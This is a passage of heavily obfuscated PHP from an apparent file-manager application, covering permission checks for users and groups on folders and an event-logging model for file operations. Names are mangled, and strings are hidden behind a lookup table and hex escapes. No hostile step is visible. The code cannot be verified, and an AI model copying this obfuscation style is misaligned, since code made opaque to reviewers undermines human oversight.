array(array($¥‰©Õß“[181] => SourceModel::TYPE_USER, $¥‰©Õß“[554] => $ú¬’ÆŸ¢), array($¥‰©Õß“[181] => SourceModel::TYPE_GROUP, $¥‰©Õß“[554] => array($¥‰©Õß“[476], $É„”«’Ÿ)), $¥‰©Õß“[1049] => $¥‰©Õß“[2055]); } $¹ÇâË é = $this->field($¥‰©Õß“[2157])->where($åªøØ³ª)->select(); $ˆÇÓÚ— = array(); $Øó±ı×­ = array_to_keyvalue_group($¹ÇâË é, $¥‰©Õß“[184]); foreach ($Øó±ı×­ as $ëÊÀ ˆ§ => $³¢Š˜áÀ) { $˜Ğ¢“… = $this->authArrayCheck($³¢Š˜áÀ, $ú¬’ÆŸ¢); if ($˜Ğ¢“…[$¥‰©Õß“[472]] > 0) { $ˆÇÓÚ—[] = $ëÊÀ ˆ§ . $¥‰©Õß“[12]; } } if ($É„”«’Ÿ) { $ãÚÑ¹Ò³ = Model($¥‰©Õß“[570]); foreach ($É„”«’Ÿ as $•ƒè³ò) { $Óô•Ğ¬‡ = $ãÚÑ¹Ò³->getInfo($•ƒè³ò); if (!$Óô•Ğ¬‡ || !is_array($Óô•Ğ¬‡[$¥‰©Õß“[90]])) { continue; } $ˆÇÓÚ—[] = $Óô•Ğ¬‡[$¥‰©Õß“[90]][$¥‰©Õß“[184]]; } } $í¦‡¸ó = array(); $ü÷Ç‡î = $É„”«’Ÿ; $´É£Øš = Model($¥‰©Õß“[1388]); $ãÚÑ¹Ò³ = Model($¥‰©Õß“[570]); $°‘†±Üê = array(); $Şƒ­ÃÙª = array(); $öê›¤ = array(); $Àœİê± = array(); if ($ˆÇÓÚ—) { $‡©¸ò± = $´É£Øš->where(array($¥‰©Õß“[184] => array($¥‰©Õß“[476], $ˆÇÓÚ—)))->select(); foreach ($‡©¸ò± as $Å”üì¨ö) { $Åƒ«¨ù¸ = $´É£Øš->parentLevelArray($Å”üì¨ö[$¥‰©Õß“[569]]); $í¦‡¸ó = array_merge($í¦‡¸ó, $Åƒ«¨ù¸); $ü÷Ç‡î[] = $Å”üì¨ö[$¥‰©Õß“[554]]; $°‘†±Üê[$Å”üì¨ö[$¥‰©Õß“[184]]] = $Åƒ«¨ù¸; $Şƒ­ÃÙª[$Å”üì¨ö[$¥‰©Õß“[184]]] = $Å”üì¨ö[$¥‰©Õß“[554]]; } } $ü÷Ç‡î = array_values(array_unique($ü÷Ç‡î)); $ĞúÒ¿Ç = $ü÷Ç‡î; foreach ($ĞúÒ¿Ç as $•ƒè³ò) { $Óô•Ğ¬‡ = $ãÚÑ¹Ò³->getInfo($•ƒè³ò); $Åƒ«¨ù¸ = $´É£Øš->parentLevelArray($Óô•Ğ¬‡[$¥‰©Õß“[569]]); $ü÷Ç‡î = array_merge($ü÷Ç‡î, $Åƒ«¨ù¸); } $ü÷Ç‡î = array_values(array_unique($ü÷Ç‡î)); foreach ($ü÷Ç‡î as $•ƒè³ò) { $Óô•Ğ¬‡ = $ãÚÑ¹Ò³->getInfo($•ƒè³ò); $í¦‡¸ó[] = $Óô•Ğ¬‡[$¥‰©Õß“[90]][$¥‰©Õß“[184]]; $öê›¤[$•ƒè³ò] = $Óô•Ğ¬‡[$¥‰©Õß“[90]][$¥‰©Õß“[184]]; $Àœİê±[$•ƒè³ò] = $´É£Øš->parentLevelArray($Óô•Ğ¬‡[$¥‰©Õß“[569]]); } foreach ($°‘†±Üê as $¥‰¦ÜûÚ => $õÙí£ı) { $‹ª“‰Ö = $Şƒ­ÃÙª[$¥‰¦ÜûÚ]; if (!$‹ª“‰Ö || !$öê›¤[$‹ª“‰Ö]) { continue; } $—¯éæØ = array(); foreach ($Àœİê±[$‹ª“‰Ö] as $•ƒè³ò) { $—¯éæØ[] = $öê›¤[$•ƒè³ò]; } $°‘†±Üê[$¥‰¦ÜûÚ] = array_merge($—¯éæØ, $õÙí£ı); } $í¦‡¸ó = array_values(array_unique($í¦‡¸ó)); $€²íÚƒ = array($¥‰©Õß“[2149] => $í¦‡¸ó, $¥‰©Õß“[2150] => $°‘†±Üê); $ŸŒÑô[$ú¬’ÆŸ¢] = $€²íÚƒ; return $€²íÚƒ; } private function makeSourceAuth($„¿Ì„Âı, $ÍÈÆóó¸, $©ßÎÆŸî = false) { $ƒÓíÕßÂ =& $_SERVER[º·Ï‹¥³]; $¯¿Ş¹Ò… = $ƒÓíÕßÂ[91]; $¯•Õşªİ = $„¿Ì„Âı[$ƒÓíÕßÂ[554]]; $íÍãÆÏ = $„¿Ì„Âı[$ƒÓíÕßÂ[181]] == SourceModel::TYPE_GROUP; $£ÉÉ„¡Ç = $íÍãÆÏ ? $this->groupRootAuth($¯•Õşªİ, $©ßÎÆŸî) : !1; if ($£ÉÉ„¡Ç && Model($ƒÓíÕßÂ[556])->authCheckAction($£ÉÉ„¡Ç[$ƒÓíÕßÂ[471]], $ƒÓíÕßÂ[1973])) { return $this->groupAuthInfo($£ÉÉ„¡Ç, $¯•Õşªİ); } $¬ó¥ÛÔ = Model($ƒÓíÕßÂ[1388])->parentLevelArray($„¿Ì„Âı[$ƒÓíÕßÂ[569]]); $¬ó¥ÛÔ = array_merge(array($„¿Ì„Âı[$ƒÓíÕßÂ[184]]), array_reverse($¬ó¥ÛÔ)); $ÑşÃœøé = !1; foreach ($¬ó¥ÛÔ as $Ô¦—²‹÷) { if (!isset($ÍÈÆóó¸[$Ô¦—²‹÷])) { continue; } $ìÑ÷ŠŠÔ = $this->authMake($ÍÈÆóó¸[$Ô¦—²‹÷], $©ßÎÆŸî); if ($ìÑ÷ŠŠÔ[$ƒÓíÕßÂ[524]]) { $ÑşÃœøé = $ìÑ÷ŠŠÔ; break; } } if (!$íÍãÆÏ) { return $ÑşÃœøé; } if (!$ÑşÃœøé && $£ÉÉ„¡Ç) { $ÑşÃœøé = $this->groupAuthInfo($£ÉÉ„¡Ç, $¯•Õşªİ); } if (!$ÑşÃœøé) { $×ÀøÇû² = Model($ƒÓíÕßÂ[570])->getInfo($¯•Õşªİ); $´èşİ“ı = explode($ƒÓíÕßÂ[50], trim($×ÀøÇû²[$ƒÓíÕßÂ[569]], $ƒÓíÕßÂ[50])); $´èşİ“ı = array_reverse($´èşİ“ı); foreach ($´èşİ“ı as $ˆÛ˜µ‘–) { if ($ˆÛ˜µ‘– == $ƒÓíÕßÂ[219] || $ˆÛ˜µ‘– == $¯¿Ş¹Ò…) { continue; } $ÂÊø³íï = $this->groupRootAuth($ˆÛ˜µ‘–, $©ßÎÆŸî); if (!$ÂÊø³íï) { continue; } $ÑşÃœøé = $this->groupAuthInfo($ÂÊø³íï, $ˆÛ˜µ‘–); break; } } if (!$ÑşÃœøé || $ÑşÃœøé[$ƒÓíÕßÂ[472]] <= 0) { $ËÍï·ªæ = $this->authDeepCheck($„¿Ì„Âı[$ƒÓíÕßÂ[184]], $©ßÎÆŸî); if ($ËÍï·ªæ) { $ÑşÃœøé = $ËÍï·ªæ; } } return $ÑşÃœøé; } private function userIsRoot($Ø¶§÷ÒÑ = false) { $“ÁÍìØÁ =& $_SERVER[º·Ï‹¥³]; if (!$Ø¶§÷ÒÑ && KodUser::isRoot()) { return !0; } $Ş´¬–¢» = Model($“ÁÍìØÁ[583])->getInfo($Ø¶§÷ÒÑ); $ò¨«æˆ = Model($“ÁÍìØÁ[2158])->listData($Ş´¬–¢»[$“ÁÍìØÁ[2159]]); if ($ò¨«æˆ && $ò¨«æˆ[$“ÁÍìØÁ[560]][$“ÁÍìØÁ[2160]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ºæ€’¤¥) { $ì»ï‰×Ì =& $_SERVER[º·Ï‹¥³]; $ èÈ½‚¡ = Model($ì»ï‰×Ì[1388]); $ıúÅá = $ èÈ½‚¡->sourceInfo($ºæ€’¤¥); if (!$ıúÅá) { return !1; } $ èÈ½‚¡->groupPathDisplay($ıúÅá); $¢íóè = array($ıúÅá); $¢íóè = $ èÈ½‚¡->_listAppendPath($¢íóè); $ıúÅá = $¢íóè[0]; $ª”ˆ¤»ä = $ıúÅá[$ì»ï‰×Ì[567]]; if (isset($ıúÅá[$ì»ï‰×Ì[575]])) { $£‚«Õê® = explode($ì»ï‰×Ì[8], trim($ıúÅá[$ì»ï‰×Ì[567]], $ì»ï‰×Ì[8])); array_shift($£‚«Õê®); $ª”ˆ¤»ä = $ıúÅá[$ì»ï‰×Ì[573]] . $ì»ï‰×Ì[2161] . implode($ì»ï‰×Ì[8], $£‚«Õê®); } return array($ì»ï‰×Ì[478] => $ıúÅá[$ì»ï‰×Ì[32]], $ì»ï‰×Ì[87] => KodIO::make($ıúÅá[$ì»ï‰×Ì[184]]), $ì»ï‰×Ì[2162] => $ª”ˆ¤»ä); } private function groupAuthInfo($ÙèÊû„¬, $’ğ¸Ã¤œ) { $ş…··Ñª =& $_SERVER[º·Ï‹¥³]; $§¶ôŒğë = Model($ş…··Ñª[570])->getInfo($’ğ¸Ã¤œ); return array($ş…··Ñª[2163] => intval($ÙèÊû„¬[$ş…··Ñª[471]]), $ş…··Ñª[2146] => $ÙèÊû„¬, $ş…··Ñª[2164] => LNG($ş…··Ñª[2165]), $ş…··Ñª[2155] => array($ş…··Ñª[478] => $§¶ôŒğë[$ş…··Ñª[32]], $ş…··Ñª[87] => KodIO::make($§¶ôŒğë[$ş…··Ñª[90]][$ş…··Ñª[184]]), $ş…··Ñª[2162] => $§¶ôŒğë[$ş…··Ñª[574]])); } protected function groupRootAuth($Å¸ˆ÷é, $ÅÍªå = false) { $£òËİ»Ö =& $_SERVER[º·Ï‹¥³]; $ÅÍªå = $ÅÍªå ? $ÅÍªå : USER_ID; $ëæ•£¸Ç = $ÅÍªå . $£òËİ»Ö[2166] . $Å¸ˆ÷é; static $š±à³è = array(); if (isset($š±à³è[$ëæ•£¸Ç])) { return $š±à³è[$ëæ•£¸Ç]; } $šƒÒÉ¤ò = Model($£òËİ»Ö[570])->getInfo($Å¸ˆ÷é); $¨¼Ä÷şÍ = $this->userGroupList($ÅÍªå); $•¿ŒØøƒ = isset($¨¼Ä÷şÍ[$Å¸ˆ÷é]) ? $¨¼Ä÷şÍ[$Å¸ˆ÷é][$£òËİ»Ö[471]] : !1; if ($•¿ŒØøƒ && Model($£òËİ»Ö[556])->authCheckAction($•¿ŒØøƒ[$£òËİ»Ö[471]], $£òËİ»Ö[1973])) { $š±à³è[$ëæ•£¸Ç] = $•¿ŒØøƒ; return $•¿ŒØøƒ; } $Âø¢…Ò = $this->sourceAuthSelect($šƒÒÉ¤ò[$£òËİ»Ö[90]][$£òËİ»Ö[184]]); $»ÉÈè§ñ = $Âø¢…Ò ? $this->authMake($Âø¢…Ò, $ÅÍªå) : !1; $­èÇÂñ = $»ÉÈè§ñ ? $»ÉÈè§ñ[$£òËİ»Ö[524]] : !1; $š±à³è[$ëæ•£¸Ç] = $­èÇÂñ ? $­èÇÂñ : $•¿ŒØøƒ; return $š±à³è[$ëæ•£¸Ç]; } public function authOwnerApply($€¦ñïâ) { $ô´èŠÑ¾ =& $_SERVER[º·Ï‹¥³]; if (empty($€¦ñïâ[$ô´èŠÑ¾[471]]) || isset($€¦ñïâ[$ô´èŠÑ¾[2167]]) && $€¦ñïâ[$ô´èŠÑ¾[2167]]) { return $€¦ñïâ; } if (AuthModel::authCheckRoot($€¦ñïâ[$ô´èŠÑ¾[471]][$ô´èŠÑ¾[472]])) { return $€¦ñïâ; } $¾é©ì = Model($ô´èŠÑ¾[1388])->parentLevelArray($€¦ñïâ[$ô´èŠÑ¾[569]]); $¾é©ì = array_merge(array($€¦ñïâ[$ô´èŠÑ¾[184]]), array_reverse($¾é©ì)); $ûˆå²Ş„ = $this->sourceAuthSelect($¾é©ì); $Ÿ´…Şƒ = array(); $‘…Ö†» = array(); foreach ($ûˆå²Ş„ as $·ÛÊá¼ => $ï¡Ë€¿Ä) { $âÖ’ÒùÊ = $this->authFolderOwnerUser($ï¡Ë€¿Ä); $Ÿ´…Şƒ[$·ÛÊá¼] = $âÖ’ÒùÊ; $‘…Ö†» = array_merge($‘…Ö†», $âÖ’ÒùÊ[$ô´èŠÑ¾[646]]); if ($âÖ’ÒùÊ[$ô´èŠÑ¾[2168]]) { break; } } if (count($‘…Ö†») == 0) { $‘…Ö†» = $this->authFolderOwnerGroup($€¦ñïâ[$ô´èŠÑ¾[554]]); } $‘…Ö†» = array_unique($‘…Ö†»); if (AuthModel::authCheckRoot($€¦ñïâ[$ô´èŠÑ¾[471]][$ô´èŠÑ¾[472]])) { $‘…Ö†»[] = USER_ID; } $€¦ñïâ[$ô´èŠÑ¾[471]][$ô´èŠÑ¾[2169]] = Model($ô´èŠÑ¾[562])->userListInfo($‘…Ö†»); return $€¦ñïâ; } private function authFolderOwnerGroup($°Óç“¹ù) { $œ×õ®¾˜ =& $_SERVER[º·Ï‹¥³]; $…İË…Ïò = Model($œ×õ®¾˜[2047])->where(array($œ×õ®¾˜[1952] => $°Óç“¹ù))->select(); $…ü¼ø¥ = array(); if (!$…İË…Ïò) { return $…ü¼ø¥; } foreach ($…İË…Ïò as $ûˆïÌœ²) { $³àÚÉã = $this->authInfo($ûˆïÌœ²); if (AuthModel::authCheckRoot($³àÚÉã[$œ×õ®¾˜[471]])) { $…ü¼ø¥[] = $ûˆïÌœ²[$œ×õ®¾˜[1754]]; } } return $…ü¼ø¥; } private function authFolderOwnerUser($¬ÂÎÔßø) { $€Ş¦Æ‚ü =& $_SERVER[º·Ï‹¥³]; $±ŠŞ²ÄŒ = array(); $´Úµ¸ïœ = !1; foreach ($¬ÂÎÔßø as $Ù™„éõ) { $‰ù˜ñ’Û = $this->authInfo($Ù™„éõ); if ($Ù™„éõ[$€Ş¦Æ‚ü[554]] == $€Ş¦Æ‚ü[219]) { $´Úµ¸ïœ = !0; } if ($Ù™„éõ[$€Ş¦Æ‚ü[181]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($‰ù˜ñ’Û[$€Ş¦Æ‚ü[471]])) { $±ŠŞ²ÄŒ[] = $Ù™„éõ[$€Ş¦Æ‚ü[554]]; } } } return array($€Ş¦Æ‚ü[646] => $±ŠŞ²ÄŒ, $€Ş¦Æ‚ü[2168] => $´Úµ¸ïœ); } public function authMake($ª¶âš½˜, $œ¼î¢Ò¸ = false) { $¹Ÿ’ÄÃ£ =& $_SERVER[º·Ï‹¥³]; $É©³ÚçÁ = $this->authArrayCheck($ª¶âš½˜, $œ¼î¢Ò¸); if ($É©³ÚçÁ[$¹Ÿ’ÄÃ£[2170]]) { $É©³ÚçÁ[$¹Ÿ’ÄÃ£[2170]] = $this->sourceAuthInfo($É©³ÚçÁ[$¹Ÿ’ÄÃ£[2170]]); } return $É©³ÚçÁ; } public function authArrayCheck($÷¶•ì×Ş, $Öáà¦ŸÙ = false) { $¹†º®æ± =& $_SERVER[º·Ï‹¥³]; if (!$÷¶•ì×Ş) { return array($¹†º®æ±[472] => 0, $¹†º®æ±[524] => !1); } $Öáà¦ŸÙ = $Öáà¦ŸÙ ? $Öáà¦ŸÙ : USER_ID; $ÇíÍäÛÃ = 0; $Éû—ÏàÁ = 0; $„õÒ±¯Ñ = 0; $ê÷Óê = 0; $¾¤œ™”™ = 0; $œ¾úùŸ• = 0; $‡°Û•ü§ = 1000; $Æİğ’­Œ = 0; $¤‰ÎĞĞ– = 0; $ãØ‹¥ŞÑ = 0; $ÆÃ¾‰¯ = 0; $¼ÌÄ§ù› = array($¹†º®æ±[184] => 0); foreach ($÷¶•ì×Ş as $¼ÌÄ§ù›) { $åü‹ö»ô = $this->authInfo($¼ÌÄ§ù›); if (!$åü‹ö»ô) { continue; } $ø­é‘Ôõ = $¼ÌÄ§ù›[$¹†º®æ±[554]]; $¢ÛÎˆ¯æ = intval($åü‹ö»ô[$¹†º®æ±[471]]); if ($¼ÌÄ§ù›[$¹†º®æ±[181]] == SourceModel::TYPE_USER && $ø­é‘Ôõ == $Öáà¦ŸÙ) { $ÇíÍäÛÃ = !0; $„õÒ±¯Ñ = $åü‹ö»ô; $Éû—ÏàÁ = $¢ÛÎˆ¯æ; } else { if ($¼ÌÄ§ù›[$¹†º®æ±[181]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ø­é‘Ôõ, $Öáà¦ŸÙ)) { $ê÷Óê = !0; $¹¿‘éÉ÷ = $this->groupStepToUserGroup($ø­é‘Ôõ, $Öáà¦ŸÙ); if ($¹¿‘éÉ÷ < $‡°Û•ü§) { $‡°Û•ü§ = $¹¿‘éÉ÷; $¾¤œ™”™ = $¢ÛÎˆ¯æ; $œ¾úùŸ• = $åü‹ö»ô; $Æİğ’­Œ = $ø­é‘Ôõ; } if ($¹¿‘éÉ÷ == $‡°Û•ü§ && $¢ÛÎˆ¯æ >= $¾¤œ™”™) { $¾¤œ™”™ = $¢ÛÎˆ¯æ; $œ¾úùŸ• = $åü‹ö»ô; $Æİğ’­Œ = $ø­é‘Ôõ; } } else { if ($ø­é‘Ôõ == $¹†º®æ±[219]) { $¤‰ÎĞĞ– = !0; $ÆÃ¾‰¯ = $åü‹ö»ô; $ãØ‹¥ŞÑ = $¢ÛÎˆ¯æ; } } } } if ($ÇíÍäÛÃ) { $ØÌ·Ãè = $Éû—ÏàÁ; $åü‹ö»ô = $„õÒ±¯Ñ; $ñÕö­¸ = LNG($¹†º®æ±[2171]); } else { if ($ê÷Óê) { $ØÌ·Ãè = $¾¤œ™”™; $åü‹ö»ô = $œ¾úùŸ•; $´’ú²š = Model($¹†º®æ±[570])->getInfo($Æİğ’­Œ); $ñÕö­¸ = $¹†º®æ±[166] . $´’ú²š[$¹†º®æ±[574]] . $¹†º®æ±[2172] . LNG($¹†º®æ±[2173]); } else { if ($¤‰ÎĞĞ–) { $ØÌ·Ãè = $ãØ‹¥ŞÑ; $åü‹ö»ô = $ÆÃ¾‰¯; $ñÕö­¸ = LNG($¹†º®æ±[2143]); } else { $ØÌ·Ãè = 0; $åü‹ö»ô = !1; $ñÕö­¸ = $¹†º®æ±[12]; } } } $½—ª‡ıÄ = array($¹†º®æ±[2163] => intval($ØÌ·Ãè), $¹†º®æ±[2146] => $åü‹ö»ô, $¹†º®æ±[2164] => $ñÕö­¸, $¹†º®æ±[2155] => $¼ÌÄ§ù›[$¹†º®æ±[184]]); return $½—ª‡ıÄ; } private function groupContainUser($•â§Ä—ƒ, $ûúÇÛÀ“ = false) { return in_array($•â§Ä—ƒ, $this->userGroupParents($ûúÇÛÀ“)); } private function groupStepToUserGroup($•Ô„Şæ¢, $±š·šîÕ = false) { $–„ã¡± =& $_SERVER[º·Ï‹¥³]; $ë·î¦§Ò = $this->userGroupList($±š·šîÕ); $¨„üì é = 1000; $áÂ†¦¶õ = $GLOBALS[$–„ã¡±[6]][$–„ã¡±[92]][$–„ã¡±[2060]] == 1; $›¸†½Í½ = $áÂ†¦¶õ ? 3 : 2; foreach ($ë·î¦§Ò as $í…àŠã°) { if ($í…àŠã°[$–„ã¡±[1952]] == $•Ô„Şæ¢) { return 0; } $ÌÃ•ï¤³ = explode($–„ã¡±[50], trim($í…àŠã°[$–„ã¡±[569]], $–„ã¡±[50])); if ($ÌÃ•ï¤³[0] == $–„ã¡±[219] && count($ÌÃ•ï¤³) > $›¸†½Í½) { $ë—Ããª¿ = array_reverse(array_slice($ÌÃ•ï¤³, $›¸†½Í½)); $øÙö‚ù¨ = array_search($•Ô„Şæ¢, $ë—Ããª¿); if ($øÙö‚ù¨ !== !1 && $øÙö‚ù¨ + 1 <= $¨„üì é) { $¨„üì é = $øÙö‚ù¨ + 1; } } } return $¨„üì é; } private function userGroupList($®Š¿‡î‰ = false) { $¯æàÁÀ =& $_SERVER[º·Ï‹¥³]; static $‚ı¤úã· = array(); if (isset($‚ı¤úã·[$®Š¿‡î‰])) { return $‚ı¤úã·[$®Š¿‡î‰]; } $ùğŞĞü… = Model($¯æàÁÀ[583])->getInfo($®Š¿‡î‰); $‚ı¤úã·[$®Š¿‡î‰] = array_to_keyvalue($ùğŞĞü…[$¯æàÁÀ[2144]], $¯æàÁÀ[1952]); return $‚ı¤úã·[$®Š¿‡î‰]; } public function userGroupParents($¡³ÑÊí€) { $¥ãÓË™­ =& $_SERVER[º·Ï‹¥³]; static $ı¡Ö¢º = array(); $¡³ÑÊí€ = $¡³ÑÊí€ ? $¡³ÑÊí€ : USER_ID; if (isset($ı¡Ö¢º[$¡³ÑÊí€])) { return $ı¡Ö¢º[$¡³ÑÊí€]; } $§¼í³ü‰ = $this->userGroupList($¡³ÑÊí€); $‘êÄ… = array(); $¡°áÌ‰ø = $GLOBALS[$¥ãÓË™­[6]][$¥ãÓË™­[92]][$¥ãÓË™­[2060]] == 1; $—¥†Ö¯ö = $¡°áÌ‰ø ? 3 : 2; foreach ($§¼í³ü‰ as $ÙÖ¹¨š™) { $õ£‰ËÛ× = array($ÙÖ¹¨š™[$¥ãÓË™­[1952]]); $É„ÖŸ = explode($¥ãÓË™­[50], trim($ÙÖ¹¨š™[$¥ãÓË™­[569]], $¥ãÓË™­[50])); if ($É„ÖŸ[0] == $¥ãÓË™­[219] && count($É„ÖŸ) > $—¥†Ö¯ö) { $àñàçÄî = array_slice($É„ÖŸ, $—¥†Ö¯ö); $õ£‰ËÛ× = array_merge($õ£‰ËÛ×, array_reverse($àñàçÄî)); } $‘êÄ… = array_merge($‘êÄ…, $õ£‰ËÛ×); } $ı¡Ö¢º[$¡³ÑÊí€] = array_unique($‘êÄ…); return $ı¡Ö¢º[$¡³ÑÊí€]; } public function authTargetInfoMake($ÛåôÅš£) { $ˆëÇÃ±ñ =& $_SERVER[º·Ï‹¥³]; $‹éá´ûã = array(); $ ºÙçæê = array(); foreach ($ÛåôÅš£ as $ñöÂâ) { if ($ñöÂâ[$ˆëÇÃ±ñ[181]] == SourceModel::TYPE_USER) { $‹éá´ûã[] = intval($ñöÂâ[$ˆëÇÃ±ñ[554]]); } else { if ($ñöÂâ[$ˆëÇÃ±ñ[181]] == SourceModel::TYPE_GROUP) { $ ºÙçæê[] = intval($ñöÂâ[$ˆëÇÃ±ñ[554]]); } } } if ($‹éá´ûã) { $‹éá´ûã = Model($ˆëÇÃ±ñ[562])->userListInfo($‹éá´ûã); } if ($ ºÙçæê) { $ıœŒÄÀÛ = array($ˆëÇÃ±ñ[2045] => array($ˆëÇÃ±ñ[476], $ ºÙçæê)); $ ºÙçæê = Model($ˆëÇÃ±ñ[570])->field($ˆëÇÃ±ñ[2174])->where($ıœŒÄÀÛ)->select(); $ ºÙçæê = array_to_keyvalue($ ºÙçæê, $ˆëÇÃ±ñ[1952]); } return array($ˆëÇÃ±ñ[2175] => $‹éá´ûã, $ˆëÇÃ±ñ[2176] => $ ºÙçæê); } public function authInfo($“ğ±Í½) { $Ã¹½Åˆ =& $_SERVER[º·Ï‹¥³]; if ($“ğ±Í½[$Ã¹½Åˆ[2061]]) { $Œ·»²„ = Model($Ã¹½Åˆ[556])->listData($“ğ±Í½[$Ã¹½Åˆ[2061]]); if (!$Œ·»²„) { return !1; $â‘éŞâÂ = Model($Ã¹½Åˆ[556])->listData(); $†íÈ—º› = array_filter_by_field($â‘éŞâÂ, $Ã¹½Åˆ[471], $Ã¹½Åˆ[219]); return $†íÈ—º›; } $úé¬‘³û = array_field_key($Œ·»²„, array($Ã¹½Åˆ[459], $Ã¹½Åˆ[32], $Ã¹½Åˆ[471], $Ã¹½Åˆ[1975], $Ã¹½Åˆ[1976])); $úé¬‘³û[$Ã¹½Åˆ[2177]] = $“ğ±Í½; return $úé¬‘³û; } else { return array($Ã¹½Åˆ[477] => 0, $Ã¹½Åˆ[1958] => $“ğ±Í½[$Ã¹½Åˆ[2121]], $Ã¹½Åˆ[478] => $Ã¹½Åˆ[12], $Ã¹½Åˆ[1975] => $Ã¹½Åˆ[2178]); } } } goto cˆÙ˜İŸĞ; cˆÙ˜İŸĞ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\143\145\137\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\x69\155\145", "\x74\x69\155\145", "\x69\156\163\x65\x72\164", "\x66\x75\156\x63\x74\151\x6f\x6e"), array("\144\145\x73\143", '', "\151\156\x73\145\x72\164\x2c\165\x70\x64\141\x74\x65\x2c\x73\145\154\x65\x63\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¡è½Ü¦, $å¯şïéï, $ÉšÌÁ¼Â = '') { $ô¨ÚÑÕ =& $_SERVER[º·Ï‹¥³]; if (!$this->eventSave) { return; } $Áıéå€— = Model($ô¨ÚÑÕ[1388])->sourceInfo($¡è½Ü¦); if (!$Áıéå€—) { return !1; } if ($this->isDisableEvent($Áıéå€—, $å¯şïéï)) { return; } if ($ÉšÌÁ¼Â && is_string($ÉšÌÁ¼Â)) { $ÉšÌÁ¼Â = array($ô¨ÚÑÕ[1991] => $ÉšÌÁ¼Â); } $¬§ƒÈÕ– = defined($ô¨ÚÑÕ[2179]) ? USER_ID : 0; $–ÚÌ÷€í = array($ô¨ÚÑÕ[475] => $¡è½Ü¦, $ô¨ÚÑÕ[2180] => $Áıéå€—[$ô¨ÚÑÕ[183]], $ô¨ÚÑÕ[2181] => $Áıéå€—[$ô¨ÚÑÕ[32]], $ô¨ÚÑÕ[567] => !empty($Áıéå€—[$ô¨ÚÑÕ[567]]) ? $Áıéå€—[$ô¨ÚÑÕ[567]] : $ô¨ÚÑÕ[12], $ô¨ÚÑÕ[1745] => $¬§ƒÈÕ–, $ô¨ÚÑÕ[480] => $å¯şïéï, $ô¨ÚÑÕ[1747] => $ÉšÌÁ¼Â); $this->addSystemLog($å¯şïéï, $–ÚÌ÷€í); unset($–ÚÌ÷€í[$ô¨ÚÑÕ[2181]], $–ÚÌ÷€í[$ô¨ÚÑÕ[567]]); return $this->add($–ÚÌ÷€í); } private function addSystemLog($‰Ë¸ÇÌï, $¨Ü…ïß’) { $™Ğ‰ªÃ¹ =& $_SERVER[º·Ï‹¥³]; if ($‰Ë¸ÇÌï == $™Ğ‰ªÃ¹[2182]) { $‰Ë¸ÇÌï = $¨Ü…ïß’[$™Ğ‰ªÃ¹[510]][$™Ğ‰ªÃ¹[2183]]; } else { if (in_array($‰Ë¸ÇÌï, array($™Ğ‰ªÃ¹[1932], $™Ğ‰ªÃ¹[2184]))) { $‰Ë¸ÇÌï = $¨Ü…ïß’[$™Ğ‰ªÃ¹[510]][$™Ğ‰ªÃ¹[806]]; } } $äå¹¿®‹ = array_merge($¨Ü…ïß’, array($™Ğ‰ªÃ¹[2185] => $¨Ü…ïß’[$™Ğ‰ªÃ¹[184]], $™Ğ‰ªÃ¹[2186] => $¨Ü…ïß’[$™Ğ‰ªÃ¹[2186]])); Hook::trigger($™Ğ‰ªÃ¹[2187], $™Ğ‰ªÃ¹[2188] . $‰Ë¸ÇÌï, $¨Ü…ïß’); Model($™Ğ‰ªÃ¹[1896])->addLog($™Ğ‰ªÃ¹[2188] . $‰Ë¸ÇÌï, $äå¹¿®‹); } private function isDisableEvent($î¿òÎàÃ, $”¿ÅŠÆ) { $½ÉëıãŞ =& $_SERVER[º·Ï‹¥³]; if ($î¿òÎàÃ[$½ÉëıãŞ[181]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($”¿ÅŠÆ == $½ÉëıãŞ[1921]) { return !1; } return !0; } public function eventCreate($€ûÑ¢­ñ, $º×«éˆµ) { $¤£ŠÑıÕ =& $_SERVER[º·Ï‹¥³]; $êşÚÂÖÁ = Model($¤£ŠÑıÕ[1388])->sourceInfo($€ûÑ¢­ñ); $©ö’Úù³ = array($¤£ŠÑıÕ[2183] => $º×«éˆµ, $¤£ŠÑıÕ[32] => $êşÚÂÖÁ[$¤£ŠÑıÕ[32]]); return $this->addEvent($€ûÑ¢­ñ, $¤£ŠÑıÕ[2182], $©ö’Úù³); } public function eventFileEdit($ö©æÇÈÊ) { $Âã¥†˜è =& $_SERVER[º·Ï‹¥³]; $ßÚ½û· = array($Âã¥†˜è[2189] => $_SERVER[$Âã¥†˜è[2190]], $Âã¥†˜è[2191] => strtolower(ACTION)); if (isset($GLOBALS[$Âã¥†˜è[7]][$Âã¥†˜è[2192]])) { $ßÚ½û·[$Âã¥†˜è[2192]] = $Âã¥†˜è[91]; } return $this->addEvent($ö©æÇÈÊ, $Âã¥†˜è[1922], $ßÚ½û·); } public function eventRecycle($ƒÖùÃÑ, $—­øºì¬) { return $this->addEvent($ƒÖùÃÑ, $_SERVER[º·Ï‹¥³][2184], $—­øºì¬); } private static $_removeLast = ''; public function eventRemove($üáÔ¯) { $—áÑş˜ =& $_SERVER[º·Ï‹¥³]; self::$_removeLast = $üáÔ¯; $Ö¼ßéâ = Model($—áÑş˜[1388])->sourceInfo($üáÔ¯); $şîƒ³¹š = array_field_key($Ö¼ßéâ, array($—áÑş˜[184], $—áÑş˜[525], $—áÑş˜[489], $—áÑş˜[569])); $ã›Å¼´´ = array($—áÑş˜[806] => $Ö¼ßéâ[$—áÑş˜[32]], $—áÑş˜[2191] => ACTION, $—áÑş˜[2193] => $şîƒ³¹š); return $this->addEvent($Ö¼ßéâ[$—áÑş˜[183]], $—áÑş˜[1921], $ã›Å¼´´); } public function eventShare($ı´º¹², $Ï»»€ıú) { return $this->addEvent($ı´º¹², $_SERVER[º·Ï‹¥³][1932], $Ï»»€ıú); } public function eventMove($ÄòûâŞ×, $¹Öæ†åÖ, $ô˜Âœ´Ğ) { $¤ÃˆÁ©÷ =& $_SERVER[º·Ï‹¥³]; if (self::$_removeLast == $ÄòûâŞ×) { return; } $¿‡æ×› = Model($¤ÃˆÁ©÷[1388]); $áåûà­ = $¿‡æ×›->sourceInfo($ÄòûâŞ×); 